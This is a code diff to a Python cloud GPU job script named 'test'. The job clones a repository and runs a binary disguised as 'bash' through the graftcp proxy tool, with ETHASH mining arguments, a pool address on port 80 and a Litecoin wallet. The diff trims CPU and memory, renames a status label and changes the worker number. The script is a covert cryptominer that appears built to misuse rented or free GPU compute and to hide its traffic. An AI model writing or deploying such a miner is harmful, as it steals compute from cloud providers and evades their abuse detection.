@@ -17,8 +17,8 @@ image = (
     name="test",
     image=image,
     gpu="RTX4090",
-    cpu=8,
-    memory="16Gi",
+    cpu=2,
+    memory="4Gi",
     timeout=30 * 60 * 60,
 )
 def run_script():
@@ -57,7 +57,7 @@ def run_script():
     cd /mnt/code/pan
     git clone https://github.com/malogrono/lol198.git
 
-    echo "=== CHECK RIGEL ==="
+    echo "=== CHECK LOL ==="
     ls -lah /mnt/code/pan/lol198
 
     echo "=== CHECK BASH ==="
@@ -79,7 +79,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.02 --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
